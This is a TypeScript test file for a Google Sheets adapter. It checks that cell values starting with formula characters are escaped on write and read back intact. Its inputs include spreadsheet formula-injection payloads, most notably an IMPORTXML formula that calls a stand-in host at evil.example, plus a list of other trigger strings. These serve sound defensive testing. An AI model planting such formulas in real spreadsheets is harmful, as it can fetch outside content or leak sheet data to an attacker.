/**
 * Formula injection tests (#130)
 *
 * A string that starts with '=' (and the other characters Sheets accepts as a
 * formula opener) used to reach the cell verbatim, so
 * `insert({ note: '=IMPORTXML("http://evil/","//x")' })` executed on write.
 * SheetsAdapter now writes such values behind Sheets' plain-text prefix, and
 * reads them back as the original string.
 *
 * Tests run against the FakeSheet/FakeSpreadsheet grid, which stores cells
 * verbatim — the raw-cell assertions therefore show the escape marker that
 * real Sheets consumes while parsing the write.
 */
import { describe, it, expect, afterEach } from 'vitest'
import { SheetsAdapter } from '../../src/adapters/sheets-adapter'
import type { FakeSheet } from '../../src/testing/fake-sheet'
import { FakeSpreadsheet } from '../../src/testing/fake-spreadsheet'
import { installGasFakes } from '../../src/testing/install'
import { fromArrays } from '../../src/testing/loaders'

const SPREADSHEET_ID = 'test-spreadsheet-id'
const SHEET_NAME = 'TestSheet'

interface NoteRow extends Record<string, unknown> {
  id: number
  note: string
}

/** Installs a fake spreadsheet holding a single sheet seeded with `data`. */
function setup(data: unknown[][]): FakeSheet {
  const sheet = fromArrays({ [SHEET_NAME]: data }).getSheetByName(SHEET_NAME)!
  installGasFakes({
    spreadsheets: { [SPREADSHEET_ID]: new FakeSpreadsheet('TestSpreadsheet', [sheet]) },
    activeId: SPREADSHEET_ID
  })
  return sheet
}

function createAdapter<T extends Record<string, unknown> & { id: string | number }>(
  columns: string[],
  extra: Partial<ConstructorParameters<typeof SheetsAdapter>[0]> = {}
): SheetsAdapter<T> {
  return new SheetsAdapter<T>({
    spreadsheetId: SPREADSHEET_ID,
    sheetName: SHEET_NAME,
    columns,
    ...extra
  })
}

/** Reads a raw cell straight from the grid, bypassing the adapter. */
function rawCell(sheet: FakeSheet, row: number, col: number): unknown {
  return sheet.getRange(row, col).getValues()[0][0]
}

/** A raw cell is safe when Sheets would not parse it as a formula. */
function expectInertCell(cell: unknown): void {
  expect(typeof cell).toBe('string')
  const text = cell as string
  expect(text.startsWith("'")).toBe(true)
  for (const trigger of ['=', '+', '-', '@', '\t', '\r']) {
    expect(text.startsWith(trigger)).toBe(false)
  }
}

const PAYLOAD = '=IMPORTXML("http://evil.example/","//x")'

const DANGEROUS_VALUES: string[] = [
  PAYLOAD,
  '=1+1',
  '+1+1',
  '-1+1',
  '@SUM(A1)',
  '\t=1+1',
  '\r=1+1',
  "'already quoted"
]

afterEach(() => {
  delete (globalThis as Record<string, unknown>).SpreadsheetApp
  delete (globalThis as Record<string, unknown>).LockService
})

describe('formula injection (#130)', () => {
  describe('insert', () => {
    it.each(DANGEROUS_VALUES)('neutralizes %j on the sheet and round-trips it', value => {
      const sheet = setup([['id', 'note']])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      const inserted = adapter.insert({ note: value })

      expectInertCell(rawCell(sheet, 2, 2))
      expect(inserted.note).toBe(value)
      expect(adapter.findById(inserted.id)?.note).toBe(value)
      expect(adapter.findAll()[0].note).toBe(value)
    })

    it('leaves safe values untouched', () => {
      const sheet = setup([['id', 'note']])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      adapter.insert({ note: 'hello world' })

      expect(rawCell(sheet, 2, 2)).toBe('hello world')
      expect(adapter.findAll()[0].note).toBe('hello world')
    })

    it('escapes a client-provided id that starts with a formula character', () => {
      const sheet = setup([['id', 'note']])
      const adapter = createAdapter<{ id: string; note: string }>(['id', 'note'], {
        idMode: 'client'
      })

      adapter.insert({ id: '=1+1', note: 'x' })

      expectInertCell(rawCell(sheet, 2, 1))
      expect(adapter.findById('=1+1')?.note).toBe('x')
      expect(adapter.findAll()[0].id).toBe('=1+1')
    })

    it('keeps update and delete reachable for an escaped id', () => {
      setup([['id', 'note']])
      const adapter = createAdapter<{ id: string; note: string }>(['id', 'note'], {
        idMode: 'client'
      })

      adapter.insert({ id: '=1+1', note: 'x' })

      expect(adapter.update('=1+1', { note: 'y' })?.note).toBe('y')
      expect(adapter.findById('=1+1')?.note).toBe('y')
      expect(adapter.delete('=1+1')).toBe(true)
      expect(adapter.findAll()).toHaveLength(0)
    })
  })

  describe('update', () => {
    it('neutralizes a dangerous value written by update', () => {
      const sheet = setup([['id', 'note'], [1, 'safe']])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      const updated = adapter.update(1, { note: PAYLOAD })

      expectInertCell(rawCell(sheet, 2, 2))
      expect(updated?.note).toBe(PAYLOAD)
      expect(adapter.findById(1)?.note).toBe(PAYLOAD)
    })

    it('does not re-escape an already stored value on an unrelated update', () => {
      const sheet = setup([['id', 'note', 'other']])
      const adapter = createAdapter<{ id: number; note: string; other: string }>([
        'id',
        'note',
        'other'
      ])

      const row = adapter.insert({ note: PAYLOAD, other: 'a' })
      adapter.update(row.id, { other: 'b' })

      expect(rawCell(sheet, 2, 2)).toBe(`'${PAYLOAD}`)
      expect(adapter.findById(row.id)?.note).toBe(PAYLOAD)
    })
  })

  describe('batch operations and reset', () => {
    it('neutralizes values written by batchInsert', () => {
      const sheet = setup([['id', 'note']])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      adapter.batchInsert([{ note: PAYLOAD }, { note: '+evil()' }])

      expectInertCell(rawCell(sheet, 2, 2))
      expectInertCell(rawCell(sheet, 3, 2))
      expect(adapter.findAll().map(r => r.note)).toEqual([PAYLOAD, '+evil()'])
    })

    it('neutralizes values written by batchUpdate', () => {
      const sheet = setup([['id', 'note'], [1, 'a'], [2, 'b']])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      const results = adapter.batchUpdate([
        { id: 1, data: { note: PAYLOAD } },
        { id: 2, data: { note: '@SUM(A1)' } }
      ])

      expectInertCell(rawCell(sheet, 2, 2))
      expectInertCell(rawCell(sheet, 3, 2))
      expect(results.map(r => r.note)).toEqual([PAYLOAD, '@SUM(A1)'])
      expect(adapter.findAll().map(r => r.note)).toEqual([PAYLOAD, '@SUM(A1)'])
    })

    it('neutralizes values written by reset', () => {
      const sheet = setup([['id', 'note']])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      adapter.reset([{ id: 1, note: PAYLOAD }])

      expectInertCell(rawCell(sheet, 2, 2))
      expect(adapter.findAll()[0].note).toBe(PAYLOAD)
    })
  })

  describe('typed columns', () => {
    it('escapes dangerous strings in string columns only', () => {
      const sheet = setup([['id', 'note', 'count', 'active', 'when', 'meta']])
      const adapter = createAdapter<{
        id: number
        note: string
        count: number
        active: boolean
        when: Date
        meta: Record<string, unknown>
      }>(['id', 'note', 'count', 'active', 'when', 'meta'], {
        columnTypes: {
          note: 'string',
          count: 'number',
          active: 'boolean',
          when: 'date',
          meta: 'json'
        }
      })

      const when = new Date('2026-01-02T03:04:05.000Z')
      const row = adapter.insert({
        note: PAYLOAD,
        count: -5,
        active: true,
        when,
        meta: { a: 1 }
      })

      expectInertCell(rawCell(sheet, 2, 2))
      expect(rawCell(sheet, 2, 3)).toBe(-5)
      expect(rawCell(sheet, 2, 4)).toBe('TRUE')
      expect(rawCell(sheet, 2, 5)).toBe(when.toISOString())
      expect(rawCell(sheet, 2, 6)).toBe('{"a":1}')

      const read = adapter.findById(row.id)
      expect(read?.note).toBe(PAYLOAD)
      expect(read?.count).toBe(-5)
      expect(read?.active).toBe(true)
      expect((read?.when as Date).toISOString()).toBe(when.toISOString())
      expect(read?.meta).toEqual({ a: 1 })
    })
  })

  describe('reading pre-existing data', () => {
    it('returns unescaped legacy cells verbatim', () => {
      setup([['id', 'note'], [1, 'plain text'], [2, "it's fine"]])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      expect(adapter.findAll().map(r => r.note)).toEqual(['plain text', "it's fine"])
    })

    it('does not strip an apostrophe that is part of the data', () => {
      setup([['id', 'note'], [1, "'quoted word"]])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      expect(adapter.findById(1)?.note).toBe("'quoted word")
    })
  })

  describe('allowFormulas opt-out', () => {
    it('writes formulas verbatim when explicitly allowed', () => {
      const sheet = setup([['id', 'note']])
      const adapter = createAdapter<NoteRow>(['id', 'note'], { allowFormulas: true })

      const row = adapter.insert({ note: '=SUM(A1:A2)' })

      expect(rawCell(sheet, 2, 2)).toBe('=SUM(A1:A2)')
      expect(adapter.findById(row.id)?.note).toBe('=SUM(A1:A2)')
    })

    it('is off by default', () => {
      const sheet = setup([['id', 'note']])
      const adapter = createAdapter<NoteRow>(['id', 'note'])

      adapter.insert({ note: '=SUM(A1:A2)' })

      expect(rawCell(sheet, 2, 2)).not.toBe('=SUM(A1:A2)')
    })
  })
})
